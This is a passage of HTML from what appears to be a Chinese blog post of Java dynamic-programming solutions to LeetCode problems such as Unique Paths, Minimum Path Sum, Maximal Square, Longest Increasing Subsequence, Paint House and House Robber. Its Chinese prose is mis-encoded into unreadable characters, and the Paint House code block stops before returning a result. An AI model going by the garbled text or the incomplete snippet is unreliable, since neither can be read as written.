æ­¤åº”è¯¥é€‰æ‹©æ­£åºéå†ä»¥å®æ—¶è·å¾—å½“å‰è¡Œå·¦è¾¹å…ƒç´ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line">        Arrays.fill(dp,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;m;j++)&#123;</span><br><span class="line">                dp[j]=dp[j]+dp[j-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="64-minimum-path-sum">64. Minimum Path Sum âˆš</span></h2><p>Given a <em>m</em> x <em>n</em> grid filled with non-negative numbers, find a path from top left to bottom right which <em>minimizes</em> the sum of all numbers along its path.</p><p><strong>Note:</strong> You can only move either down or right at any point in time.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [1,3,1],</span><br><span class="line">  [1,5,1],</span><br><span class="line">  [4,2,1]</span><br><span class="line">]</span><br><span class="line">Output: 7</span><br><span class="line">Explanation: Because the path 1â†’3â†’1â†’1â†’1 minimizes the sum.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minPathSum</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(grid.length==<span class="number">0</span>||grid[<span class="number">0</span>].length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> m=grid.length,n=grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">    Arrays.fill(dp[<span class="number">0</span>],Integer.MAX_VALUE);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=m;i++) dp[i][<span class="number">0</span>]=Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            dp[i][j]=grid[i-<span class="number">1</span>][j-<span class="number">1</span>]+Math.min(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="63-unique-paths-ii">63. Unique Paths II âˆš</span></h2><p>ä¸€ä¸ªæœºå™¨äººä½äºä¸€ä¸ª <em>m x n</em> ç½‘æ ¼çš„å·¦ä¸Šè§’ ï¼ˆèµ·å§‹ç‚¹åœ¨ä¸‹å›¾ä¸­æ ‡è®°ä¸ºâ€œStartâ€ ï¼‰ã€‚</p><p>æœºå™¨äººæ¯æ¬¡åªèƒ½å‘ä¸‹æˆ–è€…å‘å³ç§»åŠ¨ä¸€æ­¥ã€‚æœºå™¨äººè¯•å›¾è¾¾åˆ°ç½‘æ ¼çš„å³ä¸‹è§’ï¼ˆåœ¨ä¸‹å›¾ä¸­æ ‡è®°ä¸ºâ€œFinishâ€ï¼‰ã€‚</p><p><strong>ç°åœ¨è€ƒè™‘ç½‘æ ¼ä¸­æœ‰éšœç¢ç‰©</strong>ã€‚é‚£ä¹ˆä»å·¦ä¸Šè§’åˆ°å³ä¸‹è§’å°†ä¼šæœ‰å¤šå°‘æ¡ä¸åŒçš„è·¯å¾„ï¼Ÿ</p><p><img src="/2020/03/25/dp/clip_image001-1585104415889.png" alt="https://assets.leetcode.com/uploads/2018/10/22/robot_maze.png"></p><p>ç½‘æ ¼ä¸­çš„éšœç¢ç‰©å’Œç©ºä½ç½®åˆ†åˆ«ç”¨ 1 å’Œ 0 æ¥è¡¨ç¤ºã€‚</p><p>è¯´æ˜ï¼šm å’Œ n çš„å€¼å‡ä¸è¶…è¿‡ 100ã€‚</p><p><strong>ç¤ºä¾‹</strong> <strong>1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥:</span><br><span class="line">[</span><br><span class="line">  [0,0,0],</span><br><span class="line">  [0,1,0],</span><br><span class="line">  [0,0,0]</span><br><span class="line">]</span><br><span class="line">è¾“å‡º: 2</span><br><span class="line">è§£é‡Š:</span><br><span class="line">3x3 ç½‘æ ¼çš„æ­£ä¸­é—´æœ‰ä¸€ä¸ªéšœç¢ç‰©ã€‚</span><br><span class="line">ä»å·¦ä¸Šè§’åˆ°å³ä¸‹è§’ä¸€å…±æœ‰ 2 æ¡ä¸åŒçš„è·¯å¾„ï¼š</span><br><span class="line"></span><br><span class="line">1. å‘å³ -&gt; å‘å³ -&gt; å‘ä¸‹ -&gt; å‘ä¸‹</span><br><span class="line">2. å‘ä¸‹ -&gt; å‘ä¸‹ -&gt; å‘å³ -&gt; å‘å³</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePathsWithObstacles</span><span class="params">(<span class="type">int</span>[][] obstacleGrid)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obstacleGrid.length == <span class="number">0</span> || obstacleGrid[<span class="number">0</span>].length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obstacleGrid[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> obstacleGrid.length, n = obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line"></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = obstacleGrid[i][<span class="number">0</span>] == <span class="number">1</span> ? <span class="number">0</span> : dp[i - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][i] = obstacleGrid[<span class="number">0</span>][i] == <span class="number">1</span> ? <span class="number">0</span> : dp[<span class="number">0</span>][i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">            dp[i][j] = obstacleGrid[i][j] == <span class="number">1</span> ? <span class="number">0</span> : dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="221-maximal-square-">221. Maximal Square -</span></h2><p>åœ¨ä¸€ä¸ªç”± <em>0</em> å’Œ <em>1</em> ç»„æˆçš„äºŒç»´çŸ©é˜µå†…ï¼Œæ‰¾åˆ°åªåŒ…å« <em>1</em> çš„æœ€å¤§æ­£æ–¹å½¢ï¼Œå¹¶è¿”å›å…¶é¢ç§¯ã€‚</p><p><strong>ç¤ºä¾‹</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: </span><br><span class="line"></span><br><span class="line">1 0 1 0 0</span><br><span class="line">1 0 1 1 1</span><br><span class="line">1 1 1 1 1</span><br><span class="line">1 0 0 1 0</span><br><span class="line"></span><br><span class="line">è¾“å‡º: 4</span><br></pre></td></tr></table></figure><p>å’‹ä¸€çœ‹æ˜¯dfså…¶å®ä¸ç„¶ï¼Œè¯•äº†å¾ˆå¤šæ–¹æ³•éƒ½æ²¡åŠæ³•çœŸæ­£è§£å‡ºæ¥ã€‚</p><p>å…¶å®æ­£æ–¹å½¢å¤§å°è®¡ç®—å°±æ˜¯çœ‹å®ƒå·¦å³è¿˜æœ‰æ–œä¸‹è§’æ˜¯ä¸æ˜¯1ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximalSquare</span><span class="params">(<span class="type">char</span>[][] matrix)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(matrix.length==<span class="number">0</span>||matrix[<span class="number">0</span>].length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">col</span> <span class="operator">=</span> matrix[<span class="number">0</span>].length;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[row][col];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;row ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt;col ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>||j==<span class="number">0</span>) dp[i][j]=matrix[i][j]==<span class="string">&#x27;1&#x27;</span>?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (matrix[i][j]==<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                dp[i][j]=min(dp[i-<span class="number">1</span>][j],dp[i-<span class="number">1</span>][j-<span class="number">1</span>],dp[i][j-<span class="number">1</span>])+<span class="number">1</span>;</span><br><span class="line">            res=res&gt;dp[i][j]*dp[i][j]?res:dp[i][j]*dp[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c)</span>&#123;</span><br><span class="line">    a=a&gt;b?b:a;</span><br><span class="line">    a=a&gt;c?c:a;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="åºåˆ—ç±»åŠ¨æ€è§„åˆ’é—®é¢˜">åºåˆ—ç±»åŠ¨æ€è§„åˆ’é—®é¢˜</span></h1><h2><span id="300-longest-increasing-subsequence">300. Longest Increasing Subsequence âˆš</span></h2><p>ç»™å®šä¸€ä¸ªæ— åºçš„æ•´æ•°æ•°ç»„ï¼Œæ‰¾åˆ°å…¶ä¸­æœ€é•¿ä¸Šå‡å­åºåˆ—çš„é•¿åº¦ã€‚</p><p><strong>ç¤ºä¾‹</strong>:</p><p> è¾“å…¥: [10,9,2,5,3,7,101,18]<br> è¾“å‡º: 4<br> è§£é‡Š: æœ€é•¿çš„ä¸Šå‡å­åºåˆ—æ˜¯ [2,3,7,101]ï¼Œå®ƒçš„é•¿åº¦æ˜¯ 4ã€‚</p><p><strong>è¯´æ˜</strong>:</p><p>Â·  å¯èƒ½ä¼šæœ‰å¤šç§æœ€é•¿ä¸Šå‡å­åºåˆ—çš„ç»„åˆï¼Œä½ åªéœ€è¦è¾“å‡ºå¯¹åº”çš„é•¿åº¦å³å¯ã€‚</p><p>Â·  ä½ ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åº”è¯¥ä¸º O(n2) ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="type">int</span> max=<span class="number">1</span>;</span><br><span class="line">        Arrays.fill(dp,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&gt;nums[j])</span><br><span class="line">                    dp[i]=Math.max(dp[i],<span class="number">1</span>+dp[j]);                </span><br><span class="line">            &#125;</span><br><span class="line">            max = Math.max(max,dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-ç¬¬-256-å·é—®é¢˜ç²‰åˆ·æˆ¿å­">LeetCode ç¬¬ 256 å·é—®é¢˜ï¼šç²‰åˆ·æˆ¿å­ âˆš</span></h2><p>æ³¨æ„ï¼šæœ¬é¢˜ä¸º LeetCode çš„ä»˜è´¹é¢˜ç›®ï¼Œéœ€è¦å¼€é€šä¼šå‘˜æ‰èƒ½è§£é”æŸ¥çœ‹ä¸æäº¤ä»£ç ã€‚</p><p>é¢˜ç›®æè¿°</p><p>å‡å¦‚æœ‰ä¸€æ’æˆ¿å­ï¼Œå…± <em>n</em> ä¸ªï¼Œæ¯ä¸ªæˆ¿å­å¯ä»¥è¢«ç²‰åˆ·æˆçº¢è‰²ã€è“è‰²æˆ–è€…ç»¿è‰²è¿™ä¸‰ç§é¢œè‰²ä¸­çš„ä¸€ç§ï¼Œä½ éœ€è¦ç²‰åˆ·æ‰€æœ‰çš„æˆ¿å­å¹¶ä¸”ä½¿å…¶ç›¸é‚»çš„ä¸¤ä¸ªæˆ¿å­é¢œè‰²ä¸èƒ½ç›¸åŒã€‚</p><p>å½“ç„¶ï¼Œå› ä¸ºå¸‚åœºä¸Šä¸åŒé¢œè‰²æ²¹æ¼†çš„ä»·æ ¼ä¸åŒï¼Œæ‰€ä»¥æˆ¿å­ç²‰åˆ·æˆä¸åŒé¢œè‰²çš„èŠ±è´¹æˆæœ¬ä¹Ÿæ˜¯ä¸åŒçš„ã€‚æ¯ä¸ªæˆ¿å­ç²‰åˆ·æˆä¸åŒé¢œè‰²çš„èŠ±è´¹æ˜¯ä»¥ä¸€ä¸ª <em>n x 3</em> çš„çŸ©é˜µæ¥è¡¨ç¤ºçš„ã€‚</p><p>ä¾‹å¦‚ï¼Œ<code>costs[0][0]</code>è¡¨ç¤ºç¬¬ 0 å·æˆ¿å­ç²‰åˆ·æˆçº¢è‰²çš„æˆæœ¬èŠ±è´¹ï¼›<code>costs[1][2]</code>è¡¨ç¤ºç¬¬ 1 å·æˆ¿å­ç²‰åˆ·æˆç»¿è‰²çš„èŠ±è´¹ï¼Œä»¥æ­¤ç±»æ¨ã€‚è¯·ä½ è®¡ç®—å‡ºç²‰åˆ·å®Œæ‰€æœ‰æˆ¿å­æœ€å°‘çš„èŠ±è´¹æˆæœ¬ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><p>æ‰€æœ‰èŠ±è´¹å‡ä¸ºæ­£æ•´æ•°ã€‚</p><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: [[17,2,17],[16,16,5],[14,3,19]]</span><br><span class="line">è¾“å‡º: 10</span><br><span class="line">è§£é‡Š: å°† 0 å·æˆ¿å­ç²‰åˆ·æˆè“è‰²ï¼Œ1 å·æˆ¿å­ç²‰åˆ·æˆç»¿è‰²ï¼Œ2 å·æˆ¿å­ç²‰åˆ·æˆè“è‰²ã€‚</span><br><span class="line">     æœ€å°‘èŠ±è´¹: 2 + 5 + 3 = 10ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">paint</span><span class="params">(<span class="type">int</span>[][] cost)</span>&#123;</span><br><span class="line">    <span class="type">int</span> res=Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">if</span>(cost.length==<span class="number">0</span>||cost[<span class="number">0</span>].length==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n=cost.length,m=cost[<span class="number">0</span>].length;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n+<span class="number">1</span>][m];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">            dp[i][j]=Math.min(dp[i-<span class="number">1</span>][(j+<span class="number">1</span>)%m],dp[i-<span class="number">1</span>][(j+<span class="number">2</span>)%m])+cost[i-<span class="number">1</span>][j];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2><span id="198-house-robber">198. House Robber âˆš</span></h2><p>You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security system connected and <strong>it will automatically contact the police if two adjacent houses were broken into on the same night</strong>.</p><p>Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight <strong>without alerting the police</strong>.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3,1]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).</span><br><span class="line">             Total amount you can rob = 1 + 3 = 4.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(nums==<span class="literal">null</span>||nums.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> dp[] =<span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">    dp[<span class="number">0</span>]=nums[<span class="number">0</span>];</span><br><span class="line">    dp[<span class="number">1</span>]=Math.max(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;len;i++)&#123;</span><br><span class="line">        dp[i]=Math.max(dp[i-<span class="number">1</span>],dp[i-<span class="number">2</span>]+nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[len-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-ç¬¬-265-å·é—®é¢˜ç²‰åˆ·æˆ¿å­ii">LeetCode ç¬¬ 265 å·é—®é¢˜ï¼šç²‰åˆ·æˆ¿å­II âˆš</span></h2><p>æ³¨æ„ï¼šæœ¬é¢˜ä¸º LeetCode çš„ä»˜è´¹é¢˜ç›®ï¼Œéœ€è¦å¼€é€šä¼šå‘˜æ‰èƒ½è§£é”æŸ¥çœ‹ä¸æäº¤ä»£ç ã€‚</p><p>é¢˜ç›®æè¿°</p><p>å‡å¦‚æœ‰ä¸€æ’æˆ¿å­ï¼Œå…± <em>n</em> ä¸ªï¼Œæ¯ä¸ªæˆ¿å­å¯ä»¥è¢«ç²‰åˆ·æˆ <em>k</em> ç§é¢œè‰²ä¸­çš„ä¸€ç§ï¼Œä½ éœ€è¦ç²‰åˆ·æ‰€æœ‰çš„æˆ¿å­å¹¶ä¸”ä½¿å…¶ç›¸é‚»çš„ä¸¤ä¸ªæˆ¿å­é¢œè‰²ä¸èƒ½ç›¸åŒã€‚</p><p>å½“ç„¶ï¼Œå› ä¸ºå¸‚åœºä¸Šä¸åŒé¢œè‰²æ²¹æ¼†çš„ä»·æ ¼ä¸åŒï¼Œæ‰€ä»¥æˆ¿å­ç²‰åˆ·æˆä¸åŒé¢œè‰²çš„èŠ±è´¹æˆæœ¬ä¹Ÿæ˜¯ä¸åŒçš„ã€‚æ¯ä¸ªæˆ¿å­ç²‰åˆ·æˆä¸åŒé¢œè‰²çš„èŠ±è´¹æ˜¯ä»¥ä¸€ä¸ª <em>n x k</em> çš„çŸ©é˜µæ¥è¡¨ç¤ºçš„ã€‚</p><p>ä¾‹å¦‚ï¼Œ<code>costs[0][0]</code> è¡¨ç¤ºç¬¬ 0 å·æˆ¿å­ç²‰åˆ·æˆ 0 å·é¢œè‰²çš„æˆæœ¬èŠ±è´¹ï¼›<code>costs[1][2]</code> è¡¨ç¤ºç¬¬ 1 å·æˆ¿å­ç²‰åˆ·æˆ 2 å·é¢œè‰²çš„æˆæœ¬èŠ±è´¹ï¼Œä»¥æ­¤ç±»æ¨ã€‚è¯·ä½ è®¡ç®—å‡ºç²‰åˆ·å®Œæ‰€æœ‰æˆ¿å­æœ€å°‘çš„èŠ±è´¹æˆæœ¬ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><p>æ‰€æœ‰èŠ±è´¹å‡ä¸ºæ­£æ•´æ•°ã€‚</p><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: [[1,5,3],[2,9,4]]</span><br><span class="line">è¾“å‡º: 5</span><br><span class="line">è§£é‡Š: å°† 0 å·æˆ¿å­ç²‰åˆ·æˆ 0 å·é¢œè‰²ï¼Œ1 å·æˆ¿å­ç²‰åˆ·æˆ 2 å·é¢œè‰²ã€‚æœ€å°‘èŠ±è´¹: 1 + 4 = 5; </span><br><span class="line">     æˆ–è€…å°† 0 å·æˆ¿å­ç²‰åˆ·æˆ 2 å·é¢œè‰²ï¼Œ1 å·æˆ¿å­ç²‰åˆ·æˆ 0 å·é¢œè‰²ã€‚æœ€å°‘èŠ±è´¹: 3 + 2 = 5. </span><br></pre></td></tr></table></figure><p><strong>è¿›é˜¶ï¼š</strong><br> æ‚¨èƒ½å¦åœ¨ <em>O(nk)</em> çš„æ—¶é—´å¤æ‚åº¦ä¸‹è§£å†³æ­¤é—®é¢˜ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">minCostII</span><span class="params">(<span class="type">int</span>[][] costs)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (costs.length == <span class="number">0</span> || costs[<span class="number">0</span>].length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> costs.length, k = costs[<span class="number">0</span>].length;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n+<span class="number">1</span>][k];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;=n; i++) &#123;</span><br><span class="line">        Arrays.fill(dp[i],Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span 